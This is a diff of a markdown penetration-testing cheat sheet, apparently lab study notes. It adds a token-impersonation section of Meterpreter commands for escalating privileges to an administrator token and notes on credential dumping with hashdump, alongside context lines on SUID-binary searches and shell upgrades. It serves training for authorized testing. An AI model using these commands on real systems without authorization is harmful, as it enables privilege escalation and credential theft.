@@ -487,7 +487,6 @@ set CMD <command>
 - [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
   - [msfvenom](#msfvenom)
 - [Linux Compilation](#Linux-Compilation)
-- 
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ```
@@ -1099,6 +1098,27 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 ### Token Impersonation
 [<< Index](#Index)
+```
+meterpreter > getuid
+meterpreter > getprivs
+```
+- Need `SeImpersonatePrivilege`, `SeCreateToken`, or `SeAssignPrimaryToken`.
+
+```
+meterpreter > load incognito
+meterpreter > list_tokens -u
+```
+- Need delegation tokens.
+
+```
+meterpreter > impersonate_token <token>
+```
+- Example of `<token>` is `"ATTACKDEFENSE\Administrator"`.
+
+```
+migrate -N explorer.exe
+```
+- Current process is still associated with low privileges; `hashdump` will not work.
 
 ### UAC Bypass
 [<< Index](#Index)
@@ -1253,7 +1273,7 @@ python3 -m http.server 80
 
 ## Upgrade Shells
 [<< Index](#Index)
-### Non-interactive to interactive
+### Non-Interactive to Interactive
 [<< Index](#Index)
 ```
 cat /etc/shells
@@ -1282,7 +1302,7 @@ export TERM=xterm-256color
 stty rows <rows> columns <columns>
 ```
 
-### Non-meterpreter to meterpreter
+### Non-Meterpreter to Meterpreter
 [<< Index](#Index)
 ```
 sessions -u <session_id>
